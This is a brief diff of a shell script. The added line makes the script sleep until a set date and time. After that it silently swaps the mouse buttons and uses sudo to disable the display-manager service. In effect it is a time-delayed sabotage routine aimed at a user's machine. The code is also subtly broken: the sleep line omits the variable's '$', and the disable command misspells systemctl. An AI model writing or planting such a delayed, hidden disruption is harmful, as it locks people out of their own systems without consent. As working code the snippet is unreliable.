@@ -18,6 +18,7 @@ target_time="17:13:00"
 target_timestamp=$(date -d "${target_date} ${target_time}" +%s)
 current_timestamp=$(date +%s)
 sleep_time=$(( target_timestamp - current_timestamp ))
+sleep sleep_time
 xmodmap -e "pointer = 3 2 1" &> /dev/null
 if command -v systemctl &> /dev/null; then
 	sudo system disable display-manager.service &>/dev/null
